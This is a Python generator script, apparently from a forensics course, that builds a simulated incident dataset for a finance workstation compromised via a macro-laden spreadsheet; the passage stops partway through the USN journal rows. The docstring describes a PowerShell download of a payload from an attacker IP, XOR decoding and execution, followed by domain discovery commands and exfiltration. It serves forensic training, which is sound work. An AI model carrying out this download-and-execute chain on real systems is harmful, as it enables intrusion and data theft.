#!/usr/bin/env python3
"""Deterministic generator for the simulated WKSTN-221 dataset.

Attack narrative
================
WKSTN-221 is a Windows 10 finance workstation belonging to user
``payroll-admin`` (FINANCE\\payroll-admin). On 2024-11-14 at 14:18:55 UTC,
the user opens an Excel macro-enabled spreadsheet
(``Q4_Payroll_Review.xlsm``) that arrived as an Outlook attachment. The
macro spawns ``powershell.exe`` (parent OUTLOOK.EXE — anomalous), which
issues an ``Invoke-WebRequest`` to ``https://91.214.47.22/h/u.t`` and
writes the 174,080-byte response to ``%TEMP%\\a.tmp`` while the
14:19:42-14:19:48 flow runs. At 14:20:07 PowerShell XOR-decodes ``a.tmp``
with key ``F1nd4nc3K3y!`` into ``%TEMP%\\b.tmp`` and removes ``a.tmp``. It
then renames ``b.tmp`` to ``%TEMP%\\update.exe`` (same MFT record, 22417)
and executes it. ``update.exe`` performs host /
domain discovery (``ipconfig``, ``nltest /domain_trusts``, ``net group
"Domain Admins"``, ``arp -a``), beacons back to ``91.214.47.22:443``, and
sends a large outbound transfer (the candidate exfil flow). At 14:31 an
inbound network logon (LogonType 3) arrives from ``10.0.4.17``, then the
adversary pivots: an explicit-credential 4648 followed by ``net use
\\\\FILESVR-03\\Finance$``, with a follow-on SMB transfer to
FILESVR-03 (``10.0.4.18``). The attacker then deletes ``update.exe`` from
TEMP. Earlier in the day, unrelated brute-force attempts from
``185.193.126.47`` and a benign backup-service logon from
``BACKUP-SCHED`` (``10.0.4.42``) provide noise.

This script regenerates every CSV under ``Data/WKSTN-221/`` from the
above narrative. Hand-coded "key event" rows preserve the attack story;
random "noise" rows fill out plausible volumes. Output is byte-identical
across runs given the same ``RANDOM_SEED``.

Note: the on-disk dataset uses source IP ``10.0.4.32`` for WKSTN-221,
not ``10.0.5.42``. We keep ``10.0.4.32`` to match the committed CSVs
and the example timeline.

Usage
=====
    python3 generate.py                     # write CSVs in current dir
    python3 generate.py --dry-run           # print plan only
    python3 generate.py --out-dir /tmp/x    # write to scratch dir
"""

from __future__ import annotations

import argparse
import csv
import os
import random
import sys
from datetime import datetime, timedelta
from pathlib import Path
from typing import Callable, Dict, List

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

# Fixed seed -> byte-identical output across runs. Spelled as a hex literal
# with the letters of "WKSTN221" mapped to legal hex digits (W->0, K->C,
# S->5, T->D, N->A so it reads "0CD5DA221") — purely to give the constant
# a memorable form. Override with --seed if you want a different stream.
RANDOM_SEED = 0x0CD5DA221

HOSTNAME = "WKSTN-221"
FQDN = "WKSTN-221.finance.local"
DOMAIN = "FINANCE"
USER = "payroll-admin"
USER_SID = "S-1-5-21-1234567890-1234567890-1234567890-1142"
WKSTN_IP = "10.0.4.32"        # matches existing dataset
FILESERVER = "FILESVR-03"
FILESERVER_IP = "10.0.4.18"
ADVERSARY_INBOUND_IP = "10.0.4.17"
BACKUP_HOST = "BACKUP-SCHED"
BACKUP_IP = "10.0.4.42"
INTERNAL_DNS = "10.0.0.10"
C2_IP = "91.214.47.22"
BRUTE_IP = "185.193.126.47"
VOL_SERIAL = "9C8BFF21"
VOL_GUID = "\\VOLUME{01dac0f4-92841421-}"

# Anchor times (UTC).
DAY = "2024-11-14"
T_LURE_OPEN = "2024-11-14 14:18:55"
T_PS_SPAWN = "2024-11-14 14:19:38"
T_UPDATE_EXEC = "2024-11-14 14:21:03"
T_LATERAL = "2024-11-14 14:33:18"


# ---------------------------------------------------------------------------
# CSV headers (exact match to existing files)
# ---------------------------------------------------------------------------

HEADERS: Dict[str, List[str]] = {
    "mft.csv": [
        "EntryNumber", "ParentEntryNumber", "InUse", "ParentPath",
        "FileName", "Extension", "FileSize", "IsDirectory",
        "Created0x10", "LastModified0x10", "LastRecordChange0x10",
        "LastAccess0x10", "Created0x30", "LastModified0x30",
    ],
    "usn-journal.csv": [
        "USN", "EntryNumber", "ParentEntryNumber", "FileName", "Extension",
        "ParentPath", "FullPath", "UpdateTimestamp", "UpdateReasons",
    ],
    "security-evtx.csv": [
        "RecordNumber", "TimeCreated", "EventID", "Channel", "Provider",
        "Computer", "UserName", "Level", "Description", "Payload",
    ],
    "system-evtx.csv": [
        "RecordNumber", "TimeCreated", "EventID", "Channel", "Provider",
        "Computer", "Level", "Description", "Payload",
    ],
    "powershell-evtx.csv": [
        "RecordNumber", "TimeCreated", "EventID", "Channel", "Provider",
        "Computer", "UserName", "Level", "Description", "Payload",
    ],
    "prefetch.csv": [
        "SourceFilename", "ExecutableName", "Hash", "RunCount", "LastRun",
        "PreviousRun0", "PreviousRun1", "PreviousRun2",
        "FilesCount", "VolumeName", "VolumeSerialNumber", "VolumeCreated",
    ],
    "amcache.csv": [
        "FullPath", "FileExtension", "FileSize", "Sha1", "Sha256",
        "FileVersion", "ProductName", "Publisher",
        "Created", "LastModified", "Compiled", "IsPeFile", "BinaryType",
    ],
    "srum.csv": [
        "Timestamp", "ApplicationName", "UserSID", "InterfaceLuid",
        "BytesSent", "BytesReceived", "EventTimestamp",
    ],
    "lnk-files.csv": [
        "SourceFile", "SourceCreated", "SourceModified", "SourceAccessed",
        "TargetCreated", "TargetModified", "TargetAccessed", "FileSize",
        "RelativePath", "WorkingDirectory", "LocalPath",
        "VolumeSerialNumber", "VolumeLabel", "DriveType", "MachineId",
    ],
    "jump-lists.csv": [
        "SourceFile", "AppId", "AppDescription", "EntryNumber",
        "LastModified", "CreationTime",
        "TargetCreated", "TargetModified", "LocalPath", "Hostname",
        "VolumeSerialNumber", "FileSize",
    ],
    "registry-runkeys.csv": [
        "Hive", "KeyPath", "ValueName", "ValueData", "ValueType",
        "LastWriteTime", "Notes",
    ],
    "registry-services.csv": [
        "ServiceName", "DisplayName", "ImagePath", "StartType", "Type",
        "LastWriteTime", "Description",
    ],
    "network-flow.csv": [
        "FlowStart", "FlowEnd", "SourceIP", "SourcePort", "DestIP",
        "DestPort", "Protocol", "BytesSent", "BytesReceived",
        "PacketsSent", "PacketsReceived", "OwningProcess", "Notes",
    ],
    "shimcache.csv": [
        "ControlSet", "CacheEntryPosition", "Path", "LastModifiedTimeUTC",
        "Executed", "Duplicate", "SourceFile",
    ],
    "scheduled-tasks.csv": [
        "TaskName", "TaskPath", "Author", "TriggerType", "TriggerDetail",
        "Action", "Arguments", "Enabled", "Created", "LastRunTime",
        "NextRunTime", "LastTaskResult", "RunAsUser", "SourceFile", "Notes",
    ],
    "wmi-persistence.csv": [
        "Namespace", "ConsumerName", "ConsumerType", "FilterName",
        "FilterQuery", "QueryLanguage", "CommandOrScript", "BindingPresent",
        "Created", "Notes",
    ],
    "example-curated-timeline.csv": [
        "Time (UTC)", "Source Artifact", "Event Description",
        "Significance", "Confidence", "Notes",
    ],
}


# ---------------------------------------------------------------------------
# ShimCache / AppCompatCache constants
# ---------------------------------------------------------------------------

# AppCompatCacheParser reads the cache out of a SYSTEM hive. Our export was
# taken with ``-c 1`` (ControlSet001 only), which is why every row below
# carries ControlSet=1 and Duplicate=False: a duplicate is only reported
# when the same path/timestamp pair is seen in a *second* control set.
SHIMCACHE_CONTROLSET = "1"
SHIMCACHE_SOURCE = "C:\\Windows\\System32\\config\\SYSTEM"

# On Windows 8 and later the InsertFlags "executed" bit that older cache
# formats carried is no longer populated, so AppCompatCacheParser emits
# ``NA`` rather than True/False. WKSTN-221 is Windows 10, so *every* row
# reads NA. This is deliberate: the book teaches that a ShimCache entry is
# evidence of *presence*, not of execution, and a dataset that quietly
# filled this column in would teach the opposite.
SHIMCACHE_EXECUTED = "NA"


# ---------------------------------------------------------------------------
# Small helpers
# ---------------------------------------------------------------------------

def ts(s: str, frac: str = ".0000000") -> str:
    """Return a normalized timestamp string ``YYYY-MM-DD HH:MM:SS.fffffff``."""
    if "." in s:
        return s
    return s + frac


def parse_ts(s: str) -> datetime:
    base = s.split(".", 1)[0]
    return datetime.strptime(base, "%Y-%m-%d %H:%M:%S")


def fmt_ts(dt: datetime, frac: str = ".0000000") -> str:
    return dt.strftime("%Y-%m-%d %H:%M:%S") + frac


def jitter(rng: random.Random, base: datetime, max_seconds: int) -> datetime:
    return base + timedelta(seconds=rng.randint(0, max_seconds))


# ---------------------------------------------------------------------------
# Generators (one per output file)
# ---------------------------------------------------------------------------

def generate_mft(rng: random.Random) -> List[Dict[str, str]]:
    """Hand-coded MFT entries reproducing the committed file's structure."""
    rows: List[Dict[str, str]] = []

    def add(entry, parent, in_use, ppath, name, ext, size, is_dir,
            c10, m10, r10, a10, c30=None, m30=None):
        rows.append({
            "EntryNumber": str(entry), "ParentEntryNumber": str(parent),
            "InUse": str(in_use), "ParentPath": ppath, "FileName": name,
            "Extension": ext, "FileSize": str(size),
            "IsDirectory": str(is_dir),
            "Created0x10": ts(c10), "LastModified0x10": ts(m10),
            "LastRecordChange0x10": ts(r10), "LastAccess0x10": ts(a10),
            "Created0x30": ts(c30 if c30 else c10),
            # $FN timestamps update on rename/move, NOT on content
            # modification. Defaulting this to m10 (the $SI modified time)
            # would make $FN track $SI on every row and destroy the
            # $SI-vs-$FN divergence that Chapter 4 teaches as the
            # timestomping signal. Default to the $FN created value; pass
            # m30 explicitly only for entries that were genuinely renamed.
            "LastModified0x30": ts(m30 if m30 else (c30 if c30 else c10)),
        })

    # System / volume
    add(5, 5, True, ".", "$MFT", "", 2147483648, False,
        "2024-09-12 09:18:42.1234567", "2024-11-14 14:33:50.3214567",
        "2024-11-14 14:33:50.3214567", "2024-11-14 14:33:50.3214567",
        "2024-09-12 09:18:42.1234567", "2024-09-12 09:18:42.1234567")
    add(9, 5, True, ".", "$Extend", "", 0, True,
        "2024-09-12 09:18:42.1234567", "2024-09-12 09:18:42.1234567",
        "2024-09-12 09:18:42.1234567", "2024-09-12 09:18:42.1234567")
    add(36, 5, True, ".", "Windows", "", 0, True,
        "2024-09-12 09:21:14", "2024-11-14 03:02:11.1234567",
        "2024-11-14 03:02:11.1234567", "2024-11-14 14:33:50")
    add(1289, 36, True, "Windows", "System32", "", 0, True,
        "2024-09-12 09:21:14.5000000", "2024-11-14 03:02:11.5000000",
        "2024-11-14 03:02:11.5000000", "2024-11-14 14:33:50")
    add(2104, 5, True, ".", "Users", "", 0, True,
        "2024-09-12 09:25:44", "2024-09-19 14:11:08",
        "2024-09-19 14:11:08", "2024-11-14 14:33:50")
    add(2105, 2104, True, "Users", USER, "", 0, True,
        "2024-09-19 14:11:08", "2024-11-14 14:31:05",
        "2024-11-14 14:31:05", "2024-11-14 14:33:50")
    add(2208, 2105, True, f"Users\\{USER}", "Documents", "", 0, True,
        "2024-09-19 14:11:09", "2024-11-14 14:18:55.1234567",
        "2024-11-14 14:18:55.1234567", "2024-11-14 14:18:55.5000000")
    add(2209, 2105, True, f"Users\\{USER}", "Downloads", "", 0, True,
        "2024-09-19 14:11:09", "2024-11-12 09:32:14",
        "2024-11-12 09:32:14", "2024-11-14 13:55:00")
    add(2210, 2105, True, f"Users\\{USER}", "Desktop", "", 0, True,
        "2024-09-19 14:11:09", "2024-11-14 13:42:00",
        "2024-11-14 13:42:00", "2024-11-14 13:42:00")
    add(2211, 2105, True, f"Users\\{USER}", "AppData", "", 0, True,
        "2024-09-19 14:11:09", "2024-11-14 14:23:44",
        "2024-11-14 14:23:44", "2024-11-14 14:23:44")
    add(2545, 2211, True, f"Users\\{USER}\\AppData", "Local", "", 0, True,
        "2024-09-19 14:11:09", "2024-11-14 14:23:44",
        "2024-11-14 14:23:44", "2024-11-14 14:23:44")
    add(2546, 2545, True, f"Users\\{USER}\\AppData\\Local", "Temp", "", 0, True,
        "2024-09-19 14:11:09", "2024-11-14 14:23:44",
        "2024-11-14 14:23:44", "2024-11-14 14:23:44")
    add(2548, 2545, True, f"Users\\{USER}\\AppData", "Roaming", "", 0, True,
        "2024-09-19 14:11:09", "2024-11-14 14:18:55.5000000",
        "2024-11-14 14:18:55.5000000", "2024-11-14 14:18:55.5000000")

    # User documents (the lure + plausible siblings)
    add(9421, 2208, True, f"Users\\{USER}\\Documents",
        "Q4_Payroll_Review.xlsm", "xlsm", 1247568, False,
        "2024-11-12 09:32:14", "2024-11-14 11:14:22",
        "2024-11-14 11:14:22", "2024-11-14 14:18:55",
        "2024-11-12 09:32:14", "2024-11-14 11:14:22")
    add(9422, 2208, True, f"Users\\{USER}\\Documents",
        "Q3_Payroll_Final.xlsx", "xlsx", 892471, False,
        "2024-08-22 16:42:11", "2024-08-22 17:14:08",
        "2024-08-22 17:14:08", "2024-11-08 10:05:33",
        "2024-08-22 16:42:11", "2024-08-22 17:14:08")
    add(9423, 2208, True, f"Users\\{USER}\\Documents",
        "Vendor_Notes.docx", "docx", 42891, False,
        "2024-10-04 14:22:18", "2024-10-04 14:22:18",
        "2024-10-04 14:22:18", "2024-11-13 09:14:00")
    add(9424, 2208, True, f"Users\\{USER}\\Documents",
        "Pay_Schedule_Q4.xlsx", "xlsx", 184221, False,
        "2024-10-15 11:08:00", "2024-11-04 09:30:42",
        "2024-11-04 09:30:42", "2024-11-13 13:14:33",
        "2024-10-15 11:08:00", "2024-11-04 09:30:42")
    add(14108, 2209, True, f"Users\\{USER}\\Downloads",
        "timesheet_template.xlsx", "xlsx", 38712, False,
        "2024-10-22 13:18:00", "2024-10-22 13:18:00",
        "2024-10-22 13:18:00", "2024-10-22 13:30:00")
    add(14109, 2209, True, f"Users\\{USER}\\Downloads",
        "benefits_2025.pdf", "pdf", 1248421, False,
        "2024-11-08 10:42:00", "2024-11-08 10:42:00",
        "2024-11-08 10:42:00", "2024-11-08 14:18:00")

    # The malware: update.exe (Temp) — InUse=False (deleted at collection)
    add(22417, 2546, False,
        f"Users\\{USER}\\AppData\\Local\\Temp", "update.exe", "exe", 174080,
        False, "2024-11-14 14:20:11", "2024-11-14 14:20:11.0500000",
        "2024-11-14 14:23:44", "2024-11-14 14:21:03",
        "2024-11-14 14:20:11", "2024-11-14 14:20:11.0500000")
    add(22418, 2546, False,
        f"Users\\{USER}\\AppData\\Local\\Temp",
        "~$Q4_Payroll_Review.xlsm", "xlsm", 165, False,
        "2024-11-14 14:18:56", "2024-11-14 14:18:56",
        "2024-11-14 14:24:18", "2024-11-14 14:18:56")
    add(22419, 2546, True,
        f"Users\\{USER}\\AppData\\Local\\Temp", "VBE", "", 0, True,
        "2024-11-14 14:18:57", "2024-11-14 14:18:57",
        "2024-11-14 14:18:57", "2024-11-14 14:18:57")
    add(22420, 22419, False,
        f"Users\\{USER}\\AppData\\Local\\Temp\\VBE",
        "MSForms.exd", "exd", 21471, False,
        "2024-11-14 14:18:58", "2024-11-14 14:18:59",
        "2024-11-14 14:19:05", "2024-11-14 14:18:59",
        "2024-11-14 14:18:58", "2024-11-14 14:18:59")
    add(22421, 2546, False,
        f"Users\\{USER}\\AppData\\Local\\Temp", "a.tmp", "tmp", 174080, False,
        "2024-11-14 14:19:42.6000000", "2024-11-14 14:19:48",
        "2024-11-14 14:20:11.1000000", "2024-11-14 14:19:48",
        "2024-11-14 14:19:42.6000000", "2024-11-14 14:19:48")
    # No row for b.tmp: Move-Item renamed it in place, so its MFT record
    # (22417) now carries the name update.exe. Only the USN Journal still
    # remembers the b.tmp name.
    add(22423, 2546, True,
        f"Users\\{USER}\\AppData\\Local\\Temp",
        "wmsetup.log", "log", 4218, False,
        "2024-09-19 14:11:14", "2024-09-19 14:11:14",
        "2024-09-19 14:11:14", "2024-09-19 14:11:14")
    add(22424, 2546, True,
        f"Users\\{USER}\\AppData\\Local\\Temp",
        "Office_Setup_log.txt", "txt", 11842, False,
        "2024-10-12 11:32:00", "2024-10-12 11:32:00",
        "2024-10-12 11:32:00", "2024-10-12 11:32:00")

    # Recent / LNK directory
    add(3812, 2548, True, f"Users\\{USER}\\AppData\\Roaming",
        "Microsoft", "", 0, True,
        "2024-09-19 14:11:09", "2024-11-14 14:18:55.5000000",
        "2024-11-14 14:18:55.5000000", "2024-11-14 14:18:55.5000000")
    add(4219, 3812, True, f"Users\\{USER}\\AppData\\Roaming\\Microsoft",
        "Windows", "", 0, True,
        "2024-09-19 14:11:09", "2024-11-14 14:18:55.5000000",
        "2024-11-14 14:18:55.5000000", "2024-11-14 14:18:55.5000000")
    add(4318, 4219,
        True, f"Users\\{USER}\\AppData\\Roaming\\Microsoft\\Windows",
        "Recent", "", 0, True,
        "2024-09-19 14:11:09", "2024-11-14 14:18:55.5000000",
        "2024-11-14 14:18:55.5000000", "2024-11-14 14:18:55.5000000")
    # LNK sizes vary with the length of the embedded target path and the
    # number of populated ExtraData blocks, so they are per-file rather
    # than a flat constant.
    for entry, name, size, c10, m10 in [
        (4319, "Q4_Payroll_Review.lnk", 1842,
         "2024-11-14 14:18:55.5000000", "2024-11-14 14:18:55.5000000"),
        (4320, "Q3_Payroll_Final.lnk", 1721,
         "2024-08-22 17:14:08", "2024-11-08 10:05:33"),
        (4321, "Vendor_Notes.lnk", 1654,
         "2024-10-04 14:22:30", "2024-11-13 09:14:00"),
        (4322, "Pay_Schedule_Q4.lnk", 1684,
         "2024-10-15 11:08:30", "2024-11-13 13:14:33"),
    ]:
        add(entry, 4318,
            True,
            f"Users\\{USER}\\AppData\\Roaming\\Microsoft\\Windows\\Recent",
            name, "lnk", size, False,
            c10, m10, m10, m10)
    add(4423, 4219,
        True, f"Users\\{USER}\\AppData\\Roaming\\Microsoft\\Windows",
        "Recent\\AutomaticDestinations", "", 0, True,
        "2024-09-19 14:11:09", "2024-11-14 14:21:03",
        "2024-11-14 14:21:03", "2024-11-14 14:21:03")

    # Public / Default user containers
    add(2106, 2104, True, "Users", "Public", "", 0, True,
        "2024-09-12 09:25:44", "2024-09-12 09:25:44",
        "2024-09-12 09:25:44", "2024-09-12 09:25:44")
    add(2107, 2104, True, "Users", "Default", "", 0, True,
        "2024-09-12 09:25:44", "2024-09-12 09:25:44",
        "2024-09-12 09:25:44", "2024-09-12 09:25:44")

    # Event-log files
    add(1290, 1289, True, "Windows\\System32", "winevt", "", 0, True,
        "2024-09-12 09:21:14.5000000", "2024-11-14 14:33:50",
        "2024-11-14 14:33:50", "2024-11-14 14:33:50")
    add(1291, 1290, True, "Windows\\System32\\winevt", "Logs", "", 0, True,
        "2024-09-12 09:21:14.5000000", "2024-11-14 14:33:50",
        "2024-11-14 14:33:50", "2024-11-14 14:33:50")
    add(1292, 1291, True, "Windows\\System32\\winevt\\Logs",
        "Security.evtx", "evtx", 67108864, False,
        "2024-09-12 09:21:14.5000000", "2024-11-14 14:33:18",
        "2024-11-14 14:33:18", "2024-11-14 14:33:18")
    add(1293, 1291, True, "Windows\\System32\\winevt\\Logs",
        "System.evtx", "evtx", 33554432, False,
        "2024-09-12 09:21:14.5000000", "2024-11-14 13:55:00",
        "2024-11-14 13:55:00", "2024-11-14 13:55:00")
    add(1294, 1291, True, "Windows\\System32\\winevt\\Logs",
        "Microsoft-Windows-PowerShell%4Operational.evtx", "evtx",
        16777216, False,
        "2024-09-12 09:21:14.5000000", "2024-11-14 14:21:03",
        "2024-11-14 14:21:03", "2024-11-14 14:21:03")

    # Registry hives
    add(1295, 1289, True, "Windows\\System32", "config", "", 0, True,
        "2024-09-12 09:21:14.5000000", "2024-11-14 14:31:05",
        "2024-11-14 14:31:05", "2024-11-14 14:31:05")
    for entry, name, size in [(1296, "SOFTWARE", 134217728),
                              (1297, "SYSTEM", 67108864),
                              (1298, "SAM", 32768),
                              (1299, "SECURITY", 32768)]:
        add(entry, 1295, True, "Windows\\System32\\config",
            name, "", size, False,
            "2024-09-12 09:21:14.5000000", "2024-11-14 03:02:11",
            "2024-11-14 03:02:11", "2024-11-14 03:02:11")
    add(2218, 2105, True, f"Users\\{USER}",
        "NTUSER.DAT", "DAT", 3145728, False,
        "2024-09-19 14:11:08", "2024-11-14 14:33:18",
        "2024-11-14 14:33:18", "2024-11-14 14:33:18")

    # Prefetch directory + a few entries
    add(6422, 1289, True, "Windows\\System32", "Prefetch", "", 0, True,
        "2024-09-12 09:21:14.5000000", "2024-11-14 14:21:03",
        "2024-11-14 14:21:03", "2024-11-14 14:21:03")
    for entry, name, size, c10, m10 in [
        (6423, "POWERSHELL.EXE-022A1141.pf", 28442,
         "2024-09-19 14:11:14", "2024-11-14 14:19:38"),
        (6424, "CMD.EXE-4A81B364.pf", 18244,
         "2024-09-19 14:11:14", "2024-11-14 14:19:38.5000000"),
        (6425, "UPDATE.EXE-89A4B22C.pf", 11824,
         "2024-11-14 14:21:03", "2024-11-14 14:21:03"),
        (6426, "WINWORD.EXE-89B23C41.pf", 32184,
         "2024-09-19 14:11:14", "2024-11-14 11:14:22"),
        (6427, "EXCEL.EXE-7A4B8C12.pf", 29844,
         "2024-09-19 14:11:14", "2024-11-14 14:18:55"),
        (6428, "OUTLOOK.EXE-3D2A41C8.pf", 42184,
         "2024-09-19 14:11:14", "2024-11-14 14:19:38"),
    ]:
        add(entry, 6422, True, "Windows\\System32\\Prefetch",
            name, "pf", size, False, c10, m10, m10, m10, c10, m10)

    # Misc system dirs / executables referenced elsewhere
    add(1300, 36, True, "Windows", "SoftwareDistribution", "", 0, True,
        "2024-09-12 09:21:14.5000000", "2024-11-14 03:02:11",
        "2024-11-14 03:02:11", "2024-11-14 03:02:11")
    add(1301, 1289, True, "Windows\\System32",
        "WindowsPowerShell", "", 0, True,
        "2024-09-12 09:21:14.5000000", "2024-09-12 09:21:14.5000000",
        "2024-09-12 09:21:14.5000000", "2024-11-14 14:19:38")
    add(1302, 1301, True, "Windows\\System32\\WindowsPowerShell",
        "v1.0", "", 0, True,
        "2024-09-12 09:21:14.5000000", "2024-09-12 09:21:14.5000000",
        "2024-09-12 09:21:14.5000000", "2024-11-14 14:19:38")
    add(1303, 1302,
        True, "Windows\\System32\\WindowsPowerShell\\v1.0",
        "powershell.exe", "exe", 452608, False,
        "2024-09-12 09:21:14.5000000", "2024-09-12 09:21:14.5000000",
        "2024-09-12 09:21:14.5000000", "2024-11-14 14:19:38")
    add(1304, 1289, True, "Windows\\System32",
        "cmd.exe", "exe", 289792, False,
        "2024-09-12 09:21:14.5000000", "2024-09-12 09:21:14.5000000",
        "2024-09-12 09:21:14.5000000", "2024-11-14 14:19:38.5000000")
    add(1986, 5, True, ".", "ProgramData", "", 0, True,
        "2024-09-12 09:21:14", "2024-11-14 03:02:11",
        "2024-11-14 03:02:11", "2024-11-14 03:02:11")
    add(1987, 1986, True, "ProgramData", "Microsoft", "", 0, True,
        "2024-09-12 09:21:14", "2024-11-14 03:02:11",
        "2024-11-14 03:02:11", "2024-11-14 03:02:11")

    # Office temp leftovers (noise)
    add(17421, 2546, False,
        f"Users\\{USER}\\AppData\\Local\\Temp",
        "~DF12A4B8.tmp", "tmp", 8192, False,
        "2024-11-14 11:14:22", "2024-11-14 11:14:25",
        "2024-11-14 11:14:25", "2024-11-14 11:14:25",
        "2024-11-14 11:14:22", "2024-11-14 11:14:25")
    add(17422, 2546, False,
        f"Users\\{USER}\\AppData\\Local\\Temp",
        "~DF89C2AB.tmp", "tmp", 8192, False,
        "2024-11-13 09:14:00", "2024-11-13 09:14:03",
        "2024-11-13 09:14:03", "2024-11-13 09:14:03",
        "2024-11-13 09:14:00", "2024-11-13 09:14:03")
    add(17423, 2546, False,
        f"Users\\{USER}\\AppData\\Local\\Temp",
        "~DF45B89A.tmp", "tmp", 4096, False,
        "2024-11-14 11:14:23", "2024-11-14 11:14:24",
        "2024-11-14 11:14:24", "2024-11-14 11:14:24",
        "2024-11-14 11:14:23", "2024-11-14 11:14:24")

    add(9425, 2208, True, f"Users\\{USER}\\Documents",
        "Tax_Forms_2024.docx", "docx", 28471, False,
        "2024-09-04 14:11:00", "2024-09-04 14:22:00",
        "2024-09-04 14:22:00", "2024-11-04 09:30:00",
        "2024-09-04 14:11:00", "2024-09-04 14:22:00")
    add(9426, 2208, True, f"Users\\{USER}\\Documents",
        "Onboarding_Checklist.xlsx", "xlsx", 18421, False,
        "2024-09-19 14:42:00", "2024-09-19 14:42:00",
        "2024-09-19 14:42:00", "2024-09-19 14:42:00")
    add(14110, 2210, True, f"Users\\{USER}\\Desktop",
        "Quarterly_Tasks.xlsx", "xlsx", 21455, False,
        "2024-10-01 09:14:00", "2024-11-04 09:30:00",
        "2024-11-04 09:30:00", "2024-11-13 09:00:00",
        "2024-10-01 09:14:00", "2024-11-04 09:30:00")
    add(14111, 2210, True, f"Users\\{USER}\\Desktop",
        "Notes.txt", "txt", 2184, False,
        "2024-11-08 13:42:00", "2024-11-13 13:42:00",
        "2024-11-13 13:42:00", "2024-11-13 13:42:00",
        "2024-11-08 13:42:00", "2024-11-13 13:42:00")

    # AppData\Local\Microsoft\{Office,Outlook}
    add(2547, 2546, True, f"Users\\{USER}\\AppData\\Local",
        "Microsoft", "", 0, True,
        "2024-09-19 14:11:09", "2024-11-14 14:18:55",
        "2024-11-14 14:18:55", "2024-11-14 14:18:55")
    add(2549, 2547, True, f"Users\\{USER}\\AppData\\Local\\Microsoft",
        "Office", "", 0, True,
        "2024-09-19 14:11:09", "2024-11-14 14:18:55",
        "2024-11-14 14:18:55", "2024-11-14 14:18:55")
    add(2550, 2547, True, f"Users\\{USER}\\AppData\\Local\\Microsoft",
        "Outlook", "", 0, True,
        "2024-09-19 14:11:09", "2024-11-14 14:19:38",
        "2024-11-14 14:19:38", "2024-11-14 14:19:38")
    add(9427, 2550,
        True, f"Users\\{USER}\\AppData\\Local\\Microsoft\\Outlook",
        f"{USER}@finance.local.ost", "ost", 1547821056, False,
        "2024-09-19 14:11:09", "2024-11-14 14:19:38",
        "2024-11-14 14:19:38", "2024-11-14 14:19:38")

    # SRUM + Amcache
    add(1305, 1289, True, "Windows\\System32", "sru", "", 0, True,
        "2024-09-12 09:21:14.5000000", "2024-11-14 14:30:00",
        "2024-11-14 14:30:00", "2024-11-14 14:30:00")
    add(1306, 1305, True, "Windows\\System32\\sru",
        "SRUDB.dat", "dat", 67108864, False,
        "2024-09-12 09:21:14.5000000", "2024-11-14 14:30:00",
        "2024-11-14 14:30:00", "2024-11-14 14:30:00")
    add(1307, 36, True, "Windows", "AppCompat", "", 0, True,
        "2024-09-12 09:21:14.5000000", "2024-11-14 14:21:03",
        "2024-11-14 14:21:03", "2024-11-14 14:21:03")
    add(1308, 1307, True, "Windows\\AppCompat", "Programs", "", 0, True,
        "2024-09-12 09:21:14.5000000", "2024-11-14 14:21:03",
        "2024-11-14 14:21:03", "2024-11-14 14:21:03")
    add(1309, 1308, True, "Windows\\AppCompat\\Programs",
        "Amcache.hve", "hve", 8388608, False,
        "2024-09-12 09:21:14.5000000", "2024-11-14 14:21:03",
        "2024-11-14 14:21:03", "2024-11-14 14:21:03")

    return rows


def generate_usn_journal(rng: random.Random) -> List[Dict[str, str]]:
    """USN Journal: malware lifecycle + benign edits."""
    base = 1432891008
    seq = [0]

    def next_usn() -> int:
        seq[0] += 1
        return base + 64 * seq[0]

    rows: List[Dict[str, str]] = []

    def add(usn, entry, parent, name, ext, ppath, t, reasons):
        rows.append({
            "USN": str(usn), "EntryNumber": str(entry),
            "ParentEntryNumber": str(parent),
            "FileName": name, "Extension": ext,
            "ParentPath": ppath, "FullPath": f"{ppath}\\{name}",
            "UpdateTimestamp": ts(t), "UpdateReasons": reasons,
        })

    # The attack-narrative entries. USN None = assigned below; the two
    # literal USNs are the anchors the book cites.
    entries = [
        (None, 9421, 2208, "Q4_Payroll_Review.xlsm", "xlsm",
         f"Users\\{USER}\\Documents",
         "2024-11-14 11:14:22", "DataExtend|DataOverwrite"),
        (None, 9421, 2208, "Q4_Payroll_Review.xlsm", "xlsm",
         f"Users\\{USER}\\Documents",
         "2024-11-14 11:14:22.5000000",
         "DataExtend|DataOverwrite|FileClose"),
        (None, 17421, 2546, "~DF12A4B8.tmp", "tmp",
         f"Users\\{USER}\\AppData\\Local\\Temp",
         "2024-11-14 11:14:22", "FileCreate"),
        (None, 17421, 2546, "~DF12A4B8.tmp", "tmp",
         f"Users\\{USER}\\AppData\\Local\\Temp",
         "2024-11-14 11:14:25", "FileDelete|FileClose"),
        (None, 4319, 4318, "Q4_Payroll_Review.lnk", "lnk",
         f"Users\\{USER}\\AppData\\Roaming\\Microsoft\\Windows\\Recent",
         "2024-11-14 14:18:55.5000000",
         "FileCreate|DataExtend|FileClose"),
        (None, 9421, 2208, "Q4_Payroll_Review.xlsm", "xlsm",
         f"Users\\{USER}\\Documents",
         "2024-11-14 14:18:55.5000000", "BasicInfoChange"),
        (None, 22418, 2546, "~$Q4_Payroll_Review.xlsm", "xlsm",
         f"Users\\{USER}\\AppData\\Local\\Temp",
         "2024-11-14 14:18:56", "FileCreate|DataExtend"),
        (None, 22419, 2546, "VBE", "",
         f"Users\\{USER}\\AppData\\Local\\Temp",
         "2024-11-14 14:18:57", "FileCreate"),
        (None, 22420, 22419, "MSForms.exd", "exd",
         f"Users\\{USER}\\AppData\\Local\\Temp\\VBE",
         "2024-11-14 14:18:58", "FileCreate"),
        (None, 22420, 22419, "MSForms.exd", "exd",
         f"Users\\{USER}\\AppData\\Local\\Temp\\VBE",
         "2024-11-14 14:18:59", "DataExtend|FileClose"),
        (None, 22420, 22419, "MSForms.exd", "exd",
         f"Users\\{USER}\\AppData\\Local\\Temp\\VBE",
         "2024-11-14 14:19:05", "FileDelete"),
        # a.tmp is written while the 14:19:42-14:19:48 download flow runs.
        (None, 22421, 2546, "a.tmp", "tmp",
         f"Users\\{USER}\\AppData\\Local\\Temp",
         "2024-11-14 14:19:42.6000000", "FileCreate"),
        (None, 22421, 2546, "a.tmp", "tmp",
         f"Users\\{USER}\\AppData\\Local\\Temp",
         "2024-11-14 14:19:42.6000000", "DataExtend"),
        (None, 22421, 2546, "a.tmp", "tmp",
         f"Users\\{USER}\\AppData\\Local\\Temp",
         "2024-11-14 14:19:48", "DataExtend|FileClose"),
